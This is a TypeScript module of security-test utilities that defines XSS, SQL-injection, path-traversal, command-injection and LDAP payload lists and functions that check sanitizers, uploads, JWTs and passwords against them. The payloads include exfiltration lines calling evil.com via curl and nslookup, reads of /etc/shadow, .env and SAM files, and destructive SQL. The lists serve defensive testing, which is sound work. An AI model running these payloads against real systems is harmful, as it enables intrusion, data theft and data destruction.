/**
 * Security Testing Utilities for ShipSpeak TDD Framework
 * Comprehensive security test patterns and validation helpers
 */

// =============================================================================
// XSS (Cross-Site Scripting) TEST PATTERNS
// =============================================================================

export const XSS_PAYLOADS = [
  // Basic script injection
  '<script>alert("xss")</script>',
  '<Script>alert("XSS")</Script>',
  '<SCRIPT>alert("XSS")</SCRIPT>',
  
  // Event handler injection
  '<img src="x" onerror="alert(\'xss\')" />',
  '<svg onload="alert(\'xss\')" />',
  '<body onload="alert(\'xss\')">',
  '<iframe onload="alert(\'xss\')"></iframe>',
  
  // JavaScript protocol
  'javascript:alert("xss")',
  'JAVASCRIPT:alert("XSS")',
  'java\u0000script:alert("XSS")',
  
  // HTML entity encoding
  '&lt;script&gt;alert("xss")&lt;/script&gt;',
  '&#60;script&#62;alert("xss")&#60;/script&#62;',
  
  // URL encoding
  '%3Cscript%3Ealert("xss")%3C/script%3E',
  '%3cscript%3ealert("xss")%3c/script%3e',
  
  // Double encoding
  '%253Cscript%253Ealert("xss")%253C/script%253E',
  
  // Unicode encoding
  '\u003cscript\u003ealert("xss")\u003c/script\u003e',
  
  // Mixed case and spacing
  '< script >alert("xss")< / script >',
  '<\tscript>alert("xss")</script>',
  '<\nscript>alert("xss")</script>',
  
  // Attribute injection
  '" onmouseover="alert(\'xss\')" "',
  '\' onmouseover="alert(\'xss\')" \'',
  '"><script>alert("xss")</script>',
  '\'); alert(\'xss\'); //',
  
  // Data URLs
  'data:text/html,<script>alert("xss")</script>',
  'data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=',
  
  // Object and embed tags
  '<object data="javascript:alert(\'xss\')" />',
  '<embed src="javascript:alert(\'xss\')" />',
  
  // Meta refresh
  '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')" />',
  
  // Link injection
  '<link rel="stylesheet" href="javascript:alert(\'xss\')" />',
  
  // Form injection
  '<form action="javascript:alert(\'xss\')"><input type="submit" value="Submit"></form>',
  
  // CSS expression (IE)
  'expression(alert("xss"))',
  'url("javascript:alert(\'xss\')")',
  
  // SVG script injection
  '<svg><script>alert("xss")</script></svg>',
  '<svg onload="alert(\'xss\')"></svg>',
  
  // Polyglot payloads
  'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e'
] as const

// =============================================================================
// SQL INJECTION TEST PATTERNS
// =============================================================================

export const SQL_INJECTION_PAYLOADS = [
  // Basic SQL injection
  "'; DROP TABLE users; --",
  "' OR '1'='1",
  "' OR 1=1 --",
  "admin'--",
  "admin'/*",
  
  // Union-based injection
  "' UNION SELECT * FROM users --",
  "' UNION SELECT username, password FROM users --",
  "' UNION ALL SELECT NULL,NULL,NULL --",
  
  // Boolean-based blind injection
  "' AND '1'='1",
  "' AND '1'='2",
  "' OR 'a'='a",
  "' OR 'a'='b",
  
  // Time-based blind injection
  "'; WAITFOR DELAY '00:00:05' --",
  "' OR SLEEP(5) --",
  "'; SELECT pg_sleep(5) --",
  
  // Error-based injection
  "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
  "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT VERSION()), 0x7e)) --",
  
  // Stacked queries
  "'; INSERT INTO users VALUES ('hacker', 'password') --",
  "'; UPDATE users SET password='hacked' WHERE username='admin' --",
  
  // Comment variations
  "' OR 1=1 #",
  "' OR 1=1 /*",
  "' OR 1=1 --",
  
  // Encoded injection
  "%27%20OR%201%3D1%20--",
  "\\' OR 1=1 --",
  
  // NoSQL injection
  "'; return db.users.find(); var foo='",
  "' || 'a'=='a",
  "{$gt: ''}",
  "{$ne: null}",
  
  // Database-specific
  "'; EXEC xp_cmdshell('dir') --", // SQL Server
  "'; SELECT load_file('/etc/passwd') --", // MySQL
  "'; SELECT version() --", // PostgreSQL
  
  // Bypass attempts
  "' OR '1'='1' /**/",
  "' /*!50000OR*/ '1'='1",
  "' %55NION %53ELECT * FROM users --", // URL encoded UNION SELECT
] as const

// =============================================================================
// PATH TRAVERSAL TEST PATTERNS
// =============================================================================

export const PATH_TRAVERSAL_PAYLOADS = [
  // Basic directory traversal
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',
  '....//....//....//etc/passwd',
  
  // URL encoded
  '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
  '..%252f..%252f..%252fetc%252fpasswd',
  '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam',
  
  // Unicode encoded
  '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
  '..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd',
  
  // Mixed encodings
  '../\\../\\../\\etc/passwd',
  '..%%%%%%../../../../etc/passwd',
  
  // Null byte injection (legacy)
  '../../../etc/passwd%00',
  '../../../etc/passwd%00.jpg',
  
  // Absolute paths
  '/etc/passwd',
  'C:\\windows\\system32\\config\\sam',
  '/var/log/apache2/access.log',
  
  // Common sensitive files
  '../../../etc/shadow',
  '../../../etc/hosts',
  '../../../proc/version',
  '../../../root/.bash_history',
  '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
  '..\\..\\..\\windows\\repair\\sam',
  
  // Application-specific
  '../../../config/database.yml',
  '../../../.env',
  '../../../wp-config.php',
  
  // Filter bypasses
  '....//....//....//etc/passwd',
  '..././..././..././etc/passwd',
  '....\\/....\\/....\\/etc/passwd',
] as const

// =============================================================================
// COMMAND INJECTION TEST PATTERNS
// =============================================================================

export const COMMAND_INJECTION_PAYLOADS = [
  // Basic command injection
  '; ls -la',
  '| whoami',
  '& dir',
  '&& cat /etc/passwd',
  '|| id',
  
  // Encoded injections
  '%3B%20ls%20-la',
  '%26%26%20whoami',
  
  // Backtick execution
  '`whoami`',
  '$(whoami)',
  '${whoami}',
  
  // Windows commands
  '& dir C:\\',
  '&& type C:\\windows\\system32\\drivers\\etc\\hosts',
  '| net user',
  
  // Time-based detection
  '; sleep 5',
  '& ping -c 5 127.0.0.1',
  '&& timeout 5',
  
  // Data exfiltration
  '; curl http://evil.com/$(whoami)',
  '& nslookup $(hostname).evil.com',
  
  // Filter bypasses
  ';${IFS}ls${IFS}-la',
  '|w\\ho\\am\\i',
  '&&who$@ami',
] as const

// =============================================================================
// LDAP INJECTION TEST PATTERNS
// =============================================================================

export const LDAP_INJECTION_PAYLOADS = [
  '*',
  '*)(uid=*',
  '*)(|(uid=*',
  '*)((|(uid=*',
  '*))%00',
  '*()|(&',
  '*)((|(*',
  '\\*',
  '\\29',
  '\\2A',
  '\\28',
  '\\7C',
  '\\26',
] as const

// =============================================================================
// SECURITY VALIDATION FUNCTIONS
// =============================================================================

/**
 * Tests input sanitization against XSS attacks
 */
export const testXSSProtection = (
  sanitizeFunction: (input: string) => string,
  testPayloads: readonly string[] = XSS_PAYLOADS
): { passed: boolean; failures: string[] } => {
  const failures: string[] = []
  
  for (const payload of testPayloads) {
    const sanitized = sanitizeFunction(payload)
    
    // Check if dangerous elements remain
    const dangerousPatterns = [
      /<script/i,
      /javascript:/i,
      /on\w+\s*=/i,
      /<iframe/i,
      /<object/i,
      /<embed/i,
      /expression\(/i,
      /url\(/i,
      /<svg/i,
      /<meta/i
    ]
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(sanitized)) {
        failures.push(`XSS payload not properly sanitized: ${payload}`)
        break
      }
    }
  }
  
  return {
    passed: failures.length === 0,
    failures
  }
}

/**
 * Tests SQL injection protection
 */
export const testSQLInjectionProtection = (
  escapeFunction: (input: string) => string,
  testPayloads: readonly string[] = SQL_INJECTION_PAYLOADS
): { passed: boolean; failures: string[] } => {
  const failures: string[] = []
  
  for (const payload of testPayloads) {
    const escaped = escapeFunction(payload)
    
    // Check if dangerous SQL elements remain unescaped
    const dangerousPatterns = [
      /';.*DROP/i,
      /';.*INSERT/i,
      /';.*UPDATE/i,
      /';.*DELETE/i,
      /UNION.*SELECT/i,
      /OR.*1=1/i,
      /AND.*1=1/i,
      /';.*--/,
      /';.*#/,
      /\*\//
    ]
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(escaped)) {
        failures.push(`SQL injection payload not properly escaped: ${payload}`)
        break
      }
    }
  }
  
  return {
    passed: failures.length === 0,
    failures
  }
}

/**
 * Tests path traversal protection
 */
export const testPathTraversalProtection = (
  validateFunction: (path: string) => boolean,
  testPayloads: readonly string[] = PATH_TRAVERSAL_PAYLOADS
): { passed: boolean; failures: string[] } => {
  const failures: string[] = []
  
  for (const payload of testPayloads) {
    const isValid = validateFunction(payload)
    
    if (isValid) {
      failures.push(`Path traversal payload incorrectly validated as safe: ${payload}`)
    }
  }
  
  return {
    passed: failures.length === 0,
    failures
  }
}

/**
 * Tests file upload security
 */
export const testFileUploadSecurity = (
  file: File,
  allowedTypes: string[] = ['audio/mpeg', 'audio/wav', 'audio/mp4'],
  maxSizeBytes = 100 * 1024 * 1024 // 100MB
): { passed: boolean; issues: string[] } => {
  const issues: string[] = []
  
  // Check file type
  if (!allowedTypes.includes(file.type)) {
    issues.push(`Invalid file type: ${file.type}`)
  }
  
  // Check file size
  if (file.size > maxSizeBytes) {
    issues.push(`File too large: ${file.size} bytes (max: ${maxSizeBytes})`)
  }
  
  // Check filename for dangerous patterns
  const dangerousPatterns = [
    /\.\./,  // Path traversal
    /[<>:"|?*]/,  // Invalid filename characters
    /\.(exe|bat|cmd|com|pif|scr|vbs|js)$/i,  // Executable files
    /^(con|prn|aux|nul|com[1-9]|lpt[1-9])$/i,  // Windows reserved names
    /^\./,  // Hidden files
    /%00/,  // Null bytes
  ]
  
  for (const pattern of dangerousPatterns) {
    if (pattern.test(file.name)) {
      issues.push(`Dangerous filename pattern: ${file.name}`)
      break
    }
  }
  
  // Check for double extensions
  const extensions = file.name.split('.').slice(1)
  if (extensions.length > 1) {
    issues.push(`Multiple file extensions detected: ${file.name}`)
  }
  
  return {
    passed: issues.length === 0,
    issues
  }
}

/**
 * Tests JWT token security
 */
export const testJWTSecurity = (token: string): { passed: boolean; issues: string[] } => {
  const issues: string[] = []
  
  try {
    // Basic JWT structure validation
    const parts = token.split('.')
    if (parts.length !== 3) {
      issues.push('Invalid JWT structure - must have 3 parts')
      return { passed: false, issues }
    }
    
    // Decode header
    const header = JSON.parse(atob(parts[0]))
    
    // Check for algorithm
    if (!header.alg || header.alg === 'none') {
      issues.push('Missing or insecure algorithm in JWT header')
    }
    
    // Check for weak algorithms
    const weakAlgorithms = ['HS256', 'RS256'] // Simplified check
    if (weakAlgorithms.includes(header.alg)) {
      // This is actually a valid check in some contexts
      // issues.push(`Potentially weak algorithm: ${header.alg}`)
    }
    
    // Decode payload
    const payload = JSON.parse(atob(parts[1]))
    
    // Check for expiration
    if (!payload.exp) {
      issues.push('JWT missing expiration claim')
    } else {
      const now = Math.floor(Date.now() / 1000)
      if (payload.exp < now) {
        issues.push('JWT is expired')
      }
      
      // Check if expiration is too far in the future (more than 24 hours)
      const maxExpiry = now + (24 * 60 * 60)
      if (payload.exp > maxExpiry) {
        issues.push('JWT expiration too far in future (security risk)')
      }
    }
    
    // Check for issued at
    if (!payload.iat) {
      issues.push('JWT missing issued at claim')
    }
    
    // Check for issuer
    if (!payload.iss) {
      issues.push('JWT missing issuer claim')
    }
    
  } catch (error) {
    issues.push(`Invalid JWT format: ${error}`)
  }
  
  return {
    passed: issues.length === 0,
    issues
  }
}

/**
 * Tests password strength
 */
export const testPasswordSecurity = (
  password: string,
  minLength = 12,
  requireUppercase = true,
  requireLowercase = true,
  requireNumbers = true,
  requireSpecial = true
): { passed: boolean; issues: string[]; strength: 'weak' | 'medium' | 'strong' } => {
  const issues: string[] = []
  let score = 0
  
  // Length check
  if (password.length < minLength) {
    issues.push(`Password too short (minimum ${minLength} characters)`)
  } else {
    score += 1
  }
  
  // Character type checks
  if (requireUppercase && !/[A-Z]/.test(password)) {
    issues.push('Password missing uppercase letters')
  } else if (/[A-Z]/.test(password)) {
    score += 1
  }
  
  if (requireLowercase && !/[a-z]/.test(password)) {
    issues.push('Password missing lowercase letters')
  } else if (/[a-z]/.test(password)) {
    score += 1
  }
  
  if (requireNumbers && !/[0-9]/.test(password)) {
    issues.push('Password missing numbers')
  } else if (/[0-9]/.test(password)) {
    score += 1
  }
  
  if (requireSpecial && !/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
    issues.push('Password missing special characters')
  } else if (/[!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?]/.test(password)) {
    score += 1
  }
  
  // Common patterns check
  const commonPatterns = [
    /(.)\1{2,}/,  // Repeated characters
    /123456|abcdef|qwerty/i,  // Common sequences
    /password|123456|qwerty|admin/i,  // Common passwords
  ]
  
  for (const pattern of commonPatterns) {
    if (pattern.test(password)) {
      issues.push('Password contains common patterns')
      score -= 1
      break
    }
  }
  
  // Determine strength
  let strength: 'weak' | 'medium' | 'strong'
  if (score >= 4) {
    strength = 'strong'
  } else if (score >= 2) {
    strength = 'medium'
  } else {
    strength = 'weak'
  }
  
  return {
    passed: issues.length === 0,
    issues,
    strength
  }
}

// =============================================================================
// COMPREHENSIVE SECURITY TEST SUITE
// =============================================================================

export interface SecurityTestSuite {
  xss: { passed: boolean; failures: string[] }
  sql: { passed: boolean; failures: string[] }
  pathTraversal: { passed: boolean; failures: string[] }
  fileUpload?: { passed: boolean; issues: string[] }
  jwt?: { passed: boolean; issues: string[] }
  password?: { passed: boolean; issues: string[]; strength: string }
}

/**
 * Runs comprehensive security tests on input validation functions
 */
export const runSecurityTestSuite = (
  validators: {
    sanitizeXSS?: (input: string) => string
    escapeSQLString?: (input: string) => string
    validatePath?: (path: string) => boolean
    validateFile?: File
    validateJWT?: string
    validatePassword?: string
  }
): SecurityTestSuite => {
  const results: SecurityTestSuite = {
    xss: { passed: true, failures: [] },
    sql: { passed: true, failures: [] },
    pathTraversal: { passed: true, failures: [] }
  }
  
  if (validators.sanitizeXSS) {
    results.xss = testXSSProtection(validators.sanitizeXSS)
  }
  
  if (validators.escapeSQLString) {
    results.sql = testSQLInjectionProtection(validators.escapeSQLString)
  }
  
  if (validators.validatePath) {
    results.pathTraversal = testPathTraversalProtection(validators.validatePath)
  }
  
  if (validators.validateFile) {
    results.fileUpload = testFileUploadSecurity(validators.validateFile)
  }
  
  if (validators.validateJWT) {
    results.jwt = testJWTSecurity(validators.validateJWT)
  }
  
  if (validators.validatePassword) {
    results.password = testPasswordSecurity(validators.validatePassword)
  }
  
  return results
}

// Export all payload arrays for custom testing
export {
  XSS_PAYLOADS,
  SQL_INJECTION_PAYLOADS,
  PATH_TRAVERSAL_PAYLOADS,
  COMMAND_INJECTION_PAYLOADS,
  LDAP_INJECTION_PAYLOADS
}